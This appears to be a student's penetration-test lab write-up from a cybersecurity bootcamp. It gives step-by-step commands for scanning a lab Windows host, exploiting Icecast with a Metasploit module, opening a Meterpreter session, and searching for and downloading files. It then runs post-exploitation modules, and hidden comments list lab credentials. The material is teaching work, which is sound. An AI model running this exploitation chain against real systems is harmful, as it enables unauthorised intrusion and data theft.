# Penetration-Test-Engagement
This activity allowed me to play the role of an independent penetration tester hired by GoodCorp Inc. to perform security tests against their CEO’s workstation.
- The CEO claims to have passwords that are long and complex and therefore unhackable.
- I was tasked with gaining access to the CEO's computer and using a Meterpreter session to search for two files that contain the strings `recipe` and `seceretfile`.
- The deliverable for this engagement will be in the form of a report labeled `Report.docx`.

#### Setup 
- To begin, start the Icecast server to emulate the CEO's computer. 
- Then log onto the DVW10 machine and wait for the Icecast application to popup.
- Then click `Start Server`. 
 
#### Scope
- The scope of this engagement is limited to the CEO's workstation only. You are not permitted to scan any other IP addresses or exploit anything other than the CEO's IP address.
- The CEO has a busy schedule and cannot have the computer offline for an extended period of time. Therefore, denial of service and brute force attacks are prohibited. 
- After you gain access to the CEO’s computer, you may read and access any file, but you cannot delete them. Nor are you allowed to make any configurations changes to the computer.
- Since you've already been provided access to the network, OSINT won't be necessary.
 
#### Lab Environment
- Attacking machine: `Kali Linux` <!--root:toor -->
- Target machine: `DVW10` <!--IEUser:Passw0rd!-->

#### Deliverable
- [Report.docx]( Report.docx)
 
### Instructions
You've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
1. Perform a service and version scan using Nmap to determine which services are up and running:
<!-- Run the Nmap command that performs a service and version scan against the target.-->
      nmap -sV 192.168.0.20
 ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture1.png)

2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
  <!-- - Run the SearchSploit commands to show available Icecast exploits.-->
      searchsploit icecast
 ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture2.png)

3. Now that we know which exploits are available to us, let's start Metasploit: 
<!-- Run the command that starts Metasploit:-->
      msfconsole

4. Search for the Icecast module and load it for use.
<!-- - Run the command to search for the Icecast module: -->
      search icecast
 ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture3.png)

<!-- - Run the command to use the Icecast module:-->
      use exploit/windows/http/icecast_header
 ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture4.png)

5. Set the `RHOST` to the target machine. 
<!--   - Run the command that sets the `RHOST`:-->
      set RHOSTS 192.168.0.20
 ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture5.png)

6. Run the Icecast exploit.
<!--  - Run the command that runs the Icecast exploit.-->
      run
 ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture6.png)

<!--   - Run the command that performs a search for the `secretfile.txt` on the target -->
      search –f  \*secretfile\*
![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture7.png)

 7. You should now have a Meterpreter session open.
   <!-- - Run the command to performs a search for the `recipe.txt` on the target:-->
      search –f  \*recipe\*
![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture8.png)

**Bonus**: Run the command that exfiltrates the `recipe*.txt` file:

      download ‘c:\Users\IEUser\Documents\Drinks.recipe.txt’
![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture9.png)


8. You can also use Meterpreter's local exploit suggester to find possible exploits.
<!--  - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.-->
      run post/multi/recon/local_exploit_suggester
![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture10.png)

 
#### Bonus
- Run a Meterpreter post script that enumerates all logged on users.
  
      run post/windows/gather/enum_logged_on_users
  ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture11.png)

- Open a Meterpreter shell and gather system information for the target.
  
      shell
      ipconfig –all
  ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture12.png)

- Run the command that displays the target's computer system information:
  
      systeminfo
  ![Terminal image](https://github.com/oflore12/Penetration-Test-Engagment/blob/main/HW%2017%20images/Picture13.png)

---
&copy; 2020 Trilogy Education Services, a 2U Inc Brand.   All Rights Reserved.

